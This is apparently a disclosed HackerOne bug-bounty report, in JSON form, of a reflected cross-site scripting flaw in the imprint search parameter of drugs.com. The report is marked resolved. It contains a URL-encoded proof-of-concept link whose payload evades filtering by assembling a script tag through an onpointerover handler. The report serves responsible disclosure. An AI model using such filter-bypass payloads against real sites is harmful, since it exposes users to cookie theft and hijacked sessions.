{
  "id": 1211148,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMjExMTQ4",
  "url": "https://hackerone.com/reports/1211148",
  "title": "Cross-site Scripting (XSS) - Reflected",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2021-05-28T00:17:55.690Z",
  "submitted_at": "2021-05-28T00:17:55.741Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "mersenne",
    "url": "/mersenne",
    "profile_picture_urls": {
      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 12340,
    "url": "https://hackerone.com/drugs_com",
    "handle": "drugs_com",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/012/340/56f62f4d8a0a6866d907295e10ca3d0e4ab36345_original./235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/012/340/56f62f4d8a0a6866d907295e10ca3d0e4ab36345_original./3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
    },
    "permissions": [],
    "submission_state": "paused",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": false,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "Drugs.com",
      "twitter_handle": "Drugscom",
      "website": "https://www.drugs.com/",
      "about": "Drugs.com is the most popular, comprehensive and up-to-date source of drug information online."
    }
  },
  "has_bounty?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2024-08-21T14:53:20.455Z",
  "bug_reporter_agreed_on_going_public_at": "2024-07-22T14:53:14.861Z",
  "team_member_agreed_on_going_public_at": null,
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "Hello,\nI found a XSS vulnerability in https://www.drugs.com/imprints.php?imprint=&color=&shape=0\nThe vulnerability is in the parameter *imprint*.\nThe vulnerability only exists if there is at least one result in the search. However, if you put a text long enough, you will always have search results. \n\nFor example, the search: 'sometext' (https://www.drugs.com/imprints.php?imprint=sometext&color=8&shape=24) doesn't have results. However, the search 'sometextsometextsometextsometextsometextsometextsometextsometextsometextsometextsometextsometextsometext' (https://www.drugs.com/imprints.php?imprint=sometextsometextsometextsometextsometextsometextsometextsometextsometextsometextsometextsometextsometext&color=8&shape=24) have 971 results.\nIn this way, an attacker can put a long text and always have search results and perform the xss attack (although the protection against xss makes things a bit difficult).\n\n**Steps To Reproduce**:\nVisit de following POC link  (works in firefox but not in chrome) and move your mouse over the search filters ('sort by' or 'amount of results'):\nhttps://www.drugs.com/imprints.php?imprint=_%22%3E%3C%78%20%69%64%3D%22%78%22%20%76%35%3D%22%29%22%20%76%31%3D%22%3C%22%20%76%32%3D%22%53%43%52%49%50%54%3E%22%20%76%33%3D%22%61%6C%65%22%20%76%34%3D%22%72%74%28%31%22%20%76%36%3D%22%3C%2F%22%20%76%37%3D%22%53%43%52%49%50%54%3E%22%20%6F%6E%70%6F%69%6E%74%65%72%6F%76%65%72%3D%22%64%6F%63%75%6D%65%6E%74%2E%77%72%69%74%65%60%24%7B%77%69%6E%64%6F%77%2E%78%2E%61%74%74%72%69%62%75%74%65%73%2E%76%31%2E%76%61%6C%75%65%2B%77%69%6E%64%6F%77%2E%78%2E%61%74%74%72%69%62%75%74%65%73%2E%76%32%2E%76%61%6C%75%65%2B%77%69%6E%64%6F%77%2E%78%2E%61%74%74%72%69%62%75%74%65%73%2E%76%33%2E%76%61%6C%75%65%2B%77%69%6E%64%6F%77%2E%78%2E%61%74%74%72%69%62%75%74%65%73%2E%76%34%2E%76%61%6C%75%65%2B%77%69%6E%64%6F%77%2E%78%2E%61%74%74%72%69%62%75%74%65%73%2E%76%35%2E%76%61%6C%75%65%2B%77%69%6E%64%6F%77%2E%78%2E%61%74%74%72%69%62%75%74%65%73%2E%76%36%2E%76%61%6C%75%65%2B%77%69%6E%64%6F%77%2E%78%2E%61%74%74%72%69%62%75%74%65%73%2E%76%37%2E%76%61%6C%75%65%7D%60%22%3E&color=8&shape=24\n\n## Impact\n\nAn XSS attack allows an attacker to execute arbitrary JavaScript in the context of the attacked website and the attacked user. This can be abused to steal session cookies,  redirect users on malicious website, perform requests in the name of the victim, and more.",
  "weakness": {
    "id": 61,
    "name": "Cross-site Scripting (XSS) - Reflected"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2024-08-21T14:53:15.086Z",
  "allow_singular_disclosure_after": -34140444.89126696,
  "singular_disclosure_allowed": true,
  "vote_count": 49,
  "voters": [
    "orange303",
    "loaymorad",
    "saishi",
    "g3ksec",
    "0xcyborg",
    "zy9ard3",
    "shubham_srt",
    "spaghettisec",
    "mohaned0101",
    "muhammad-saud",
    "and 39 more..."
  ],
  "severity": {
    "rating": "medium",
    "author_type": "User"
  },
  "structured_scope": {
    "databaseId": 15634,
    "asset_type": "URL",
    "asset_identifier": "www.drugs.com",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
